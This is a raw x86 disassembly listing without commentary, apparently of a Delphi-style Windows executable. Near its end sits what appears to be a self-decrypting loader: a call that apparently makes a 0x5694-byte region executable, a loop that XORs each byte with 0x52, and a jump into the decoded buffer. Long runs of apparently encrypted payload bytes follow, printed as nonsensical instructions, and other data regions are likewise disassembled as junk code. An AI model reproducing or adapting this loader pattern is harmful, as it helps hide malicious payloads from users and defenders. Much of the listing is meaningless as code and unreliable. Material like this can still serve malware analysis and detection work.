add [ ebp - 0x75 ] dl
in al dx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45f6b6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f6bd
lea eax [ ebp - 0x24 ]
mov edx 0x6
call sub_403e78
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e78
retn
mov edx esi
mov eax ebx
call sub_45eed8
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_416254
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45f687
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov edx esi
mov eax [ ebp - 0xc ]
call sub_415c60
lea eax [ ebp - 0x8 ]
call sub_403e54
cmp [ ebx + 0x61 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x4 ]
call sub_403eec
cmp [ ebx + 0x62 ] 0x0
je r-xdata
call sub_409814
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ ebp - 0x8 ]
call sub_40a44c
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403104
retn
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x14 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40c9e0
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_403eec
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x18 ]
push eax
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x1c ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40c9e0
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0x4 ]
call sub_403eec
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x20 ]
push eax
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x24 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40c9e0
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x4 ]
call sub_403eec
sub_45f6e3
inc [ ecx ]
add [ eax ] al
add [ edx ] cl
add [ eax ] al
add dh dh
inc eax
sbb al 0x2
je r-xdata
cmp dl [ eax + 0x60 ]
je r-xdata
mov [ eax + 0x63 ] dl
retn
retn
mov ecx edx
mov [ eax + 0x60 ] cl
test cl cl
je r-xdata
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx [ eax ]
call [ edx + 0x60 ]
jmp r-xdata
sub_45f714
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45f739
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f740
retn
sub_45f988
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45f9ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f9b4
retn
sub_45f9ea
inc ebp
add ah al
lahf
inc ecx
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add al dl
inc ebp
add [ esp + eax * 2 ] cl
inc ecx
add ah cl
fwait
inc ecx
add [ eax ] ch
inc ebx
inc ecx
add [ ebx + esi * 8 + 0x45 ] bl
add [ eax ] cl
out dx eax
inc ebp
add [ esp + ebx * 4 - 0x6253ffbf ] dh
inc ecx
add ah bl
lahf
inc ecx
add ah al
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
inc ecx
add [ eax + 0x300045f2 ] dl
out dx eax
inc ebp
add [ edi + ebp * 8 + 0x45 ] al
add [ edi + ebp * 8 + 0x45 ] dl
add [ eax - 0x11 ] ch
inc ebp
add [ edx + esi * 8 ] dh
inc ebp
add [ eax ] al
inc ebp
add [ ebx + esi * 8 + 0x45 ] ch
add [ esi * 8 - 0x517ffbb ] ch
inc ebp
add [ esp + edi * 8 ] bl
inc ebp
add ah dh
cli
inc ebp
add [ eax - 0x67ffba05 ] cl
cld
inc ebp
add ah ch
test [ ebp ] 0x20
std
inc ebp
add al dh
cld
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x6800406d ] ah
add [ eax ] al
add [ edx ] cl
push esp
dec ecx
dec esp
outsd
inc esi
imul ebp [ ebp - 0x73 ] 0xfaa00040
inc ebp
add [ edi ] al
or dl [ ecx + ecx * 2 + 0x64 ]
dec esp
outsd
inc esi
imul ebp [ ebp + 0xc ] 0xa00045fa
int1
inc ebp
add [ edx ] cl
add [ ecx ] cl
dec ecx
dec esp
outsd
inc esi
imul ebp [ ebp + 0x1 ] 0x406da000
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46080009 ] al
imul ebp [ ebp + 0x6e ] 0x8d656d61
inc eax
add [ ebx - 0x77179340 ] al
aad 0xfa
inc ebx
lea eax [ eax ]
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45fb60
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059b8
push [ ebp - 0x8 ]
push esi
push r-xdata
push edi
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x5
call sub_4041d4
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fb67
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e78
retn
sub_45fb7f
inc [ edx ]
add [ eax ] al
add [ 0x5500000a ] cl
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45fbf4
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059b8
push [ ebp - 0x8 ]
push esi
push r-xdata
push edi
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x5
call sub_4041d4
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fbfb
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e78
retn
sub_45fc13
inc [ edx ]
add [ eax ] al
add [ 0x5500000a ] cl
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45fc7f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059b8
push [ ebp - 0x8 ]
push esi
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4041d4
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fc86
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e78
retn
sub_45fc8f
inc [ edx ]
add [ eax ] al
add [ 0x5300000a ] cl
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x68 ]
call sub_408344
test al al
jne r-xdata
push 0x22
mov ecx [ ebx + 0x68 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_415e78
mov esi eax
mov [ ebx + 0x6c ] esi
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_4159e4
push 0xffff
mov ecx [ ebx + 0x68 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_415e78
mov [ ebx + 0x6c ] eax
jmp r-xdata
sub_45fcf0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_404114
test eax eax
jle r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_404114
push eax
mov eax ebx
call sub_404314
mov edx eax
mov eax [ esi + 0x6c ]
pop ecx
call sub_415c28
sub_45fd20
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45fe81
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_403e54
lea eax [ ebp - 0x8 ]
call sub_403e54
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
lea eax [ ebp - 0xc ]
push eax
mov edx edi
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_408be0
cmp [ ebx + 0x62 ] 0x0
je r-xdata
call sub_409814
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_40a44c
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
call sub_404160
push [ ebp - 0x4 ]
push [ ebp - 0xc ]
push r-xdata
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4041d4
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fe88
lea eax [ ebp - 0x28 ]
mov edx 0xa
call sub_403e78
retn
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x18 ]
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_40c9e0
mov edx [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
call sub_403eec
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x20 ]
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_40c9e0
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0xc ]
call sub_403eec
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x24 ]
push eax
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x28 ]
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_40c9e0
mov edx [ ebp - 0x24 ]
lea eax [ ebp - 0xc ]
call sub_403eec
sub_45febf
inc [ ecx ]
add [ eax ] al
add [ edx ] cl
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_45feed
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fef4
retn
sub_45ff04
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ ecx ] al
inc esi
add [ eax ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl dh
add [ esi ] al
and [ ebx ] al
add [ eax ] al
test al 0xfe
inc esp
add ah al
lahf
inc ecx
add al cl
sub al [ ebp ]
jl r-xdata
inc ebp
add [ ecx ] dh
inc ebx
add ah bl
lahf
inc ecx
add [ eax + edi + 0x45 ] ah
add [ esp + ebx * 4 + 0x74040041 ] bh
inc ebp
add [ ecx + ebp ] bh
inc ebp
add [ ecx + edx + 0x44 ] dl
add [ eax + 0x16 ] dh
inc esp
add [ ebp + edx - 0x696fffbc ] bh
inc ebx
add al dl
or eax [ eax + eax + 0x44 ]
xor eax 0x9080045
inc esp
add al bl
xchg ebp eax
inc ebx
add ah bl
xchg ebp eax
inc ebx
add [ eax ] bh
inc ebp
add al bh
lds eax [ ebx ]
sbb al 0xa1
inc ebx
add [ edi + edx * 4 + 0x43 ] dl
add [ eax + 0x2c0043a2 ] ch
cmp [ ebp ] al
clc
inc ebp
add al ah
mov [ 0x38a40043 ] eax
inc ebp
add [ esi + eax * 8 + 0x43 ] bh
add [ ecx + ecx + 0x44 ] bl
add [ eax ] bl
or al [ eax + eax + 0x14 ]
add eax 0x9fc0044
inc esp
add [ eax + ebp ] bh
inc ebp
add [ eax + 0x3f ] cl
inc ebp
add al cl
fild [ ebx ]
or al 0x4c
inc ebp
add [ edi + ecx * 2 + 0x45 ] ch
add [ eax ] ch
dec esi
inc ebp
add [ eax - 0x20 ] ah
inc ebx
add [ eax + 0x43 ] ah
add [ eax + edx * 2 - 0x213bffbb ] ah
inc ebx
add [ ebx + ecx ] bh
inc esp
add [ eax + 0x7c004557 ] bl
sbb al 0x44
add [ eax - 0x53ffbbf9 ] bh
insb
inc ebp
add [ eax ] dh
and al [ ebp ]
loopne r-xdata
inc ebp
add [ eax + 0x33 ] ah
inc eax
add al ch
push eax
inc ebp
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah ah
sub al 0x45
add [ eax + 0x16 ] al
inc esp
add [ edx + esi + 0x45 ] dl
add [ eax ] ch
inc ebx
inc ecx
add [ esi + ebp + 0x2ee00045 ] ah
inc ebp
add ah ch
das
inc ebp
add [ edx ] cl
add cl bh
add [ esi ] al
clc
add al [ eax ]
add [ eax ] al
add [ edx ] dl
dec edi
jo r-xdata
inc ebp
add [ ebp + ebx * 2 + 0x2dc80045 ] cl
inc ebp
add [ esi + ebp + 0x45 ] al
add [ eax + esi * 2 + 0x2b000045 ] cl
inc ebp
add [ eax + 0x7000456b ] dl
push edx
inc ebp
add [ ebp + ebp * 2 + 0x45 ] al
add [ eax ] ch
cmp [ ebp ] al
or al [ eax ]
stc
imul ebp [ edi + 0x47 ] 0x70756f72
outsb
push eax
imul esp [ ebx + 0x74 ] 0x44657275
imul esp [ ecx + 0x6c ] 0xfc31676f
add al [ eax ]
add [ ecx ] al
add [ edx ] cl
push eax
outsd
jo r-xdata
push 0x40
push 0x5694
mov eax [ ebp - 0x4 ]
push eax
push 0xffffffff
call ecx
nop
push 0x0
call ReplyMessage
mov ecx ebx
test ecx ecx
jb r-xdata
outsb
je r-xdata
or [ eax ] eax
or ecx [ ecx + 0x64 ]
dec esp
outsd
inc ebp
jbe r-xdata
xor [ ebx + eax ] ebx
add [ eax ] al
jo r-xdata
pop ebx
mov esp ebp
inc ecx
mov [ ebp - 0xc ] 0x0
nop
sub [ ecx ] al
inc esi
push es
push esp
inc esi
outsd
jb r-xdata
outsd
jne r-xdata
outsb
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
xor edx edx
nop
nop
add edx [ ebp - 0x4 ]
nop
add edx [ ebp - 0x8 ]
mov al [ edx ]
nop
xor al 0x52
nop
mov [ edx ] al
nop
inc [ ebp - 0xc ]
dec ecx
jne r-xdata
pop ebp
retn
xor [ edi + edi * 8 + 0x45 ] ecx
add al dh
inc [ eax + eax + 0x5e ]
add [ 0x74696e55 ] al
xor [ eax ] eax
add [ ebx - 0x1374aa40 ] cl
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
add al ch
xor eax 0x8bfffa65

xor [ edx ] ecx
add [ eax ] al
loope r-xdata
outsd
jb r-xdata
xor [ ebx + eax ] edx
add [ eax ] al
pop es
or [ edi + 0x72 ] eax
add [ ebx ] al
add [ eax ] al
add al [ eax ]
push es
dec esp
popad
bound esp [ ebp + 0x6c ]
xor [ ebx + eax ] eax
add [ eax ] al
add eax [ eax ]
or [ ebx + 0x68 ] eax
arpl [ gs : ebx + 0x42 ] bp
outsd
js r-xdata
add [ eax ] al
mov eax eax
add [ edi ] al
push es
push esp
inc esi
add al dl
xchg edi eax
inc esp
add [ edi + eax + 0x19280043 ] al
inc ebx
add [ eax + 0x10 ] ch
inc ebx
add al cl
pop ebp
inc esp
add al al
stc
inc ebp
add ah ch
test [ ebp ] 0x46012890
in al dx
inc edx
outsd
js r-xdata
add [ ebx ] cl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x31831
add [ eax ] cl
add [ edx ] cl
dec ecx
dec esp
outsd
inc esi
add eax [ eax ]
add [ edi ] al
or [ ebx ] al
add [ eax ] al
add al 0x0
pop es
inc edx
jne r-xdata
imul ebp [ ebp + 0x31 ] 0x31c
adc [ ebx ] al
add [ eax ] al
push es
add [ ebx ] cl
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
inc [ edx ]
call 0xffffffffec4643ae
push 0xc8004310
je r-xdata
sbb [ ebx ] eax
outsd
jne r-xdata
outsb
xor [ ebx + eax ] ecx
add [ eax ] al
add eax 0x72470900
sub_460144
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
push 0x40
push 0x5694
mov eax [ ebp - 0x4 ]
push eax
push 0xffffffff
call ecx
nop
push 0x0
call ReplyMessage
mov ecx ebx
test ecx ecx
jb r-xdata
pop ebx
mov esp ebp
pop ebp
retn
inc ecx
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
xor edx edx
nop
nop
add edx [ ebp - 0x4 ]
nop
add edx [ ebp - 0x8 ]
mov al [ edx ]
nop
xor al 0x52
nop
mov [ edx ] al
nop
inc [ ebp - 0xc ]
dec ecx
jne r-xdata
sub_4601a0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
nop
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
test ebx ebx
je r-xdata
nop
push r-xdata
call sub_4601a0
retn 0xc2c2
mov ecx r-xdata
mov edx 0x5694
mov eax ebx
call sub_460144
add ebx 0x368b
jae r-xdata
mov [ ebp - 0x4 ] ebx
nop
nop
jmp [ ebp - 0x4 ]
call sub_403044
sub_4601f7
xor al 0xdb
pop es
mov dl 0x8
mov ebx 0x52527d6b
add ebp ebx
bound edx [ edx + 0x52 ]
push edx
fst [ ss : ebx - 0x27 ]
adc bl [ esi - 0x45 ]
push edi
jno r-xdata
xchg ecx eax
retn 0xc2c2
push edx
retn 0xc2c2
sub_460350
push edx
mov edx 0x52525e7a
fst [ esi ]
jbe r-xdata
inc eax
push edx
push edx
retn 0xc2c2
lodsd [ esi ]
bound edx [ edi - 0x2a ]
push edx
push edx
push edx
add bl bh
salc
jbe r-xdata
scasb [ edi ]
add al [ ecx ]
add [ ebx + 0x525267a2 ] edi
retn 0xd7c2
push edx
push edx
push edx
add bh [ edx + 0x52525195 ]
rcl [ esi - 0x446d28a2 ] 0x1
ror [ edx + 0x52 ] 0x1
push edx
retn 0xbb01
sub_46038a
mov dl cl
xchg esi eax
pop esi
xlat
mov [ ebp - 0x2a ] ebx
pop ss
dec edx
push edx
push edx
push edx
or edx edi
xchg edx eax
pop ebp
xlat
jecxz r-xdata
mov ebx 0x5252408c
retn 0xc2c2
pop ecx
push edx
push edx
fstp [ esi ]
jbe r-xdata
lodsd [ esi ]
lodsd [ esi ]
fist [ edi ]
out dx al
mov ebx 0x52527f92
retn 0xc2c2
sub_4603d5
add [ ebx + 0x52521f31 ] edi
mov edx 0x5252524a
pop ecx
push edx
push edx
fstp [ esi ]
jbe r-xdata
lodsd [ esi ]
lodsd [ esi ]
fist [ edi ]
out dx al
mov ebx 0x52527f92
retn 0xc2c2
or edx edi
xchg edx eax
pop ebp
xlat
jecxz r-xdata
dec edx
push edx
push edx
push edx
mov ebx 0x5252408c
retn 0xc2c2
sub_460463
fld [ ebp + 0x527e6bba ]
push edx
xlat
xchg edx eax
pop ebp
salc
popfd
add [ edx + 0x52 ] dl
adc ebx edx
xchg ebp eax
salc
push edx
push edx
push edx
imul ecx [ ebp + ebx * 2 - 0x52527322 ] 0xd9261ad
or al 0x9
xchg ecx eax
add [ ebp - 0x5f4471d9 ] ebp
insd
push edx
push edx
retn 0x7c2
sub_4604c7
aam 0xee
push edx
push edx
push edx
cmp edx [ edx + 0x525252d6 ]
push ecx
aam 0x92
push edx
push edx
push edx
fstp st7
stosb [ edi ]
scasd [ edi ]
lodsd [ esi ]
lodsd [ esi ]
mov edx 0x52525fae
lodsd [ esi ]
aam 0xee
push edx
push edx
push edx
fstp st7
xchg [ edi + 0x102adad ] ch
lodsd [ esi ]
add al 0x46
fucomi st7
xchg [ edi - 0x6d285253 ] ch
pop ebp
xlat
test al 0x11
push edx
push edx
adc cl [ 0x5d919b09 ]
salc
outsb
adc [ edx + 0x52 ] edx
cmp [ eax + 0xb ] dh
cmp [ edi - 0x45 ] dh
insb
push esp
push edx
push edx
retn 0xc2c2
sub_460557
push edx
lodsd [ esi ]
add al 0x2a
fldcw [ edx - 0x29a25229 ]
dec ecx
dec ebp
push edx
push edx
lodsd [ esi ]
daa
pop esi
lodsd [ esi ]
daa
pop edx
add eax 0x52c6c4ad
push edx
push edx
fist [ edi ]
scasb [ edi ]
xlat
xchg edx eax
pop ebp
salc
push ecx
dec ebp
push edx
push edx
add bh [ ebx + 0x52524440 ]
retn 0xc2c2
sub_460589
adc [ edx + 0x5d ] ecx
shl [ ecx - 0x28adad9e ] 0x1
lodsd [ esi ]
mov ebx 0x52525f38
xor al 0xdb
pop es
push 0xffffffd9
lodsb [ esi ]
xor al 0xdb
das
mov esp 0xdb3484d9
pop es
push 0xddbbaad9
adc al 0x52
push edx
retn 0x27ad
sub_460609
test eax 0x51bbadad
bound edx [ edx + 0x52 ]
lodsd [ esi ]
and bl [ esi - 0x53 ]
and bl [ edx - 0x27 ]
xchg ebp eax
mov ebx 0x52527be1
fild [ edi ]
cmpsb [ esi ] [ edi ]
fst [ edi ]
scasb [ edi ]
fist [ edi ]
mov edx 0xdbaa17d9
pop ss
mov esi 0xdba617d9
pop ss
mov [ 0xffffffff80619261 ] al
fist [ edi ]
scasb [ edi ]
fstp [ edi ]
scasb [ edi ]
fldcw [ esi ]
fistp [ edx + 0xbba461 ]
dec ebx
push edx
push edx
retn 0xbac2
sub_46064d
bound edx [ edx + 0x52 ]
cmp [ esi ] dl
mov ebx 0x52526f9a
pop ebp
shl dh 0x1
pop edx
push edx
push edx
or al 0xd9
xchg ebp eax
or eax 0x526cacbb
push edx
xor al 0xdb
lss ecx [ ecx ]
mov ebx 0x52527a31
retn 0xd907
sub_46079a
pop ebp
salc
xlat
push ebp
push edx
push edx
mov ebx 0x5252175d
pop ebp
xlat
je r-xdata
retn 0xc2c2
push edx
push edx
mov ebx 0xadada8e9
retn 0x5dc2
sub_4608fb
pop ss
mov [ 0x3477380a ] al
fist [ edi ]
mov al [ 0xffffffffbb3b380a ]
sub eax 0xd9525274
and dh [ edx - 0x27 ]
adc cl [ edx + 0x51 ]
stosd [ edi ]
push ecx
mov edx [ ecx - 0x5d ]
fist [ edi ]
stosb [ edi ]
xlat
xchg edx eax
pop ebp
xlat
lodsd [ esi ]
sbb edx [ edx + 0x52 ]
popad
xchg edx eax
mov ebx 0x52524aef
retn 0x1f51
sub_460936
push ebx
add al 0x38
push ecx
cmp ah dl
in al dx
sbb esi ebx
lodsd [ esi ]
in eax 0x96
push edx
push edx
push edx
mov edx 0xadadaf75
mov ebx 0x52521676
cmp [ esi ] dh
xor al 0xdb
pop ds
or [ ebx ] 0x38
and eax 0x801fdb34
or edi [ eax ]
mov ebx 0x525253df
pop ebp
aam 0x29
inc esi
push edx
push edx
pop ebp
in eax 0x58
in eax dx
or [ 0xffffffff95bb5252 ] ah
push edx
push edx
retn 0xd9c2
sub_4609b7
xchg edx eax
fwait
xchg ecx eax
pop ebp
xlat
or ebp [ eax - 0x52445253 ]
pop esi
push edx
push edx
fist [ esi ]
bound ecx [ edx + 0x38 ]
push ss
mov ebx 0x52527a15
retn 0xad02
sub_460a0a
shr [ ecx ] 0x1
adc al 0x52
pop ebp
salc
pop ecx
push edx
push edx
push edx
shr [ esi ] 0x1
jbe r-xdata
bound ebx [ ebp - 0x2a ]
push edi
push edx
push edx
push edx
mov edx 0x52527aab
fld [ esi ]
jbe r-xdata
push edx
pop ebp
xlat
xlat
push 0x563a5252
push ebx
push edx
push edx
mov ebx 0x52526cfe
retn 0xbb02
vrsqrtss xmm2 xmm0 [ edx + 0x52 ]
mov ebx 0x52524eb2
retn 0x1a10
shr [ esi ] 0x1
jbe r-xdata
push edx
xor al 0xdb
pop ds
push ebx
lodsd [ esi ]
and [ edx - 0x27 ] esp
lodsb [ esi ]
lodsd [ esi ]
jbe r-xdata
xchg [ ebx ] cl
cmp [ edx ] ch
mov ebx 0x52521473
fistp [ edi ]
pop ebp
xlat
cmp eax 0xbb52521a
loope r-xdata
retn 0xc2c2
sub bh [ ebx + 0x52521473 ]
push edx
push edx
or eax 0x15e3bb09
push edx
push edx
pop ebp
salc
imul ebx [ edi ] 0x87bb5252
dec ebp
push edx
push edx
fstp st7
push cs
scasd [ edi ]
lodsd [ esi ]
lodsd [ esi ]
add ah [ ecx - 0x5c ]
mov ebx 0x52524f3f
retn 0xd9c2
sub_460ad1
daa
pop edx
xor al 0xdb
pminsw mm3 mmx1
mov [ edx ] al
fst [ esp + esi + 0x34ee0fdb ]
fild [ edi ]
xchg edx eax
xor al 0xdb
das
cwde
xor al 0xdb
pop ds
sahf
mov ebx 0x52526979
xor al 0xdb
pop ds
xchg [ ebx ] cl
cmp [ edx ] ch
mov ebx 0x52521473
retn 0xc2c2
sub_460b14
add [ ecx ] eax
fstp st7
out dx al
test al 0xad
lodsd [ esi ]
mov ebx 0x525244b7
or al 0xbb
jo r-xdata
fldcw [ edx + 0x526b04bb ]
push edx
fstp [ edi ]
push edx
push edx
retn 0x1795
inc esi
mov edx 0x5252550b
mov ebx 0x52527101
cmp dh [ ecx + esi + 0x38 ]
lds eax [ ecx ]
fcmovnbe st4
mov edx 0xba525252
and eax 0xd1525265
xchg esi eax
jb r-xdata
imul edx [ edx + 0x52 ] 0xffffffd9
pop ds
aam 0xa2
push edx
push edx
push edx
fist [ edi ]
mov dl 0x2
xchg ebp eax
pop ss
mov dl 0x33
and al 0x33
xchg ebp eax
pop ss
mov dh 0x22
cmp esp [ ecx + 0x60 ]
mov ebx 0x52524359
retn 0xc2c2
sub_460b6c
fld [ edi ]
nop
fldcw [ esp + esi + 0x38962fdb ]
add al 0xd9
stosb [ edi ]
mov ebx 0x52526b04
fstp [ edi ]
inc esi
mov edx 0x5252550b
mov ebx 0x52527101
cmp dh [ ecx + esi + 0x38 ]
lds eax [ ecx ]
fcmovnbe st4
mov edx 0xba525252
and eax 0xd1525265
xchg esi eax
jb r-xdata
imul edx [ edx + 0x52 ] 0xffffffd9
pop ds
aam 0xa2
push edx
push edx
push edx
fist [ edi ]
mov dl 0x2
xchg ebp eax
pop ss
mov dl 0x33
and al 0x33
xchg ebp eax
pop ss
mov dh 0x22
cmp esp [ ecx + 0x60 ]
mov ebx 0x52524359
retn 0xc2c2
sub_460ce1
push ebx
push edx
push edx
add [ ebp + 0x5252fec4 ] ebp
push edx
cmp ch [ ebp + 0x1525252 ]
add al 0xbb
and [ ebx + 0x52 ] dl
push edx
xor al 0x6b
pop edx
mov ebx 0x5252782b
retn 0xc2c2
sub_460d1f
popad
lodsd [ esi ]
add [ 0x52fec4ad ] edx
push edx
push edx
fst [ ebp - 0x2ef6f3f3 ]
xchg edi eax
fwait
xchg ecx eax
pop ebp
salc
xchg edx eax
push 0x523a5252
pop edx
push edx
push edx
fstp st7
[ esi ] [ edi ]
lodsd [ esi ]
lodsd [ esi ]
add [ edx ] eax
mov edx 0x52527bb0
rcl [ esi - 0x1545fba2 ] 0x1
jno r-xdata
retn 0xd1c2
push edx
or edi [ ebx + 0x52526a2c ]
fst [ edx ]
sub dl cl
aaa
scasb [ edi ]
push edx
push ecx
xchg ebx eax
fldcw [ edx ]
dec esi
mov ebx 0xadadaf99
retn 0xd9c2
sub_460d6e
xor [ ebx + ebx * 8 ] 0x7
mov al 0xd9
xor [ ebx + ebx * 8 ] 0x7
mov dh 0xbb
salc
jb r-xdata
inc [ edx + edx * 2 + 0x52 ]
cmp [ esi + 0x3a ] dl
push edx
bound edx [ edx + 0x52 ]
add [ eax ] edi
push edx
lodsd [ esi ]
push edx
add al 0xdf
fstp st6
scasd [ edi ]
lodsd [ esi ]
lodsd [ esi ]
mov edx 0x52524d73
or edi [ ebx + 0x52525f6a ]
retn 0xc2c2
sub_460e6d
push edx
rcl [ esi + 0x762edb5e ] 0x1
inc esi
add al 0xba
push es
dec esi
push edx
push edx
or ebx ebx
push ss
jbe r-xdata
push edx
add eax 0x524a1fbb
push edx
pop ebp
rol cl 0x1
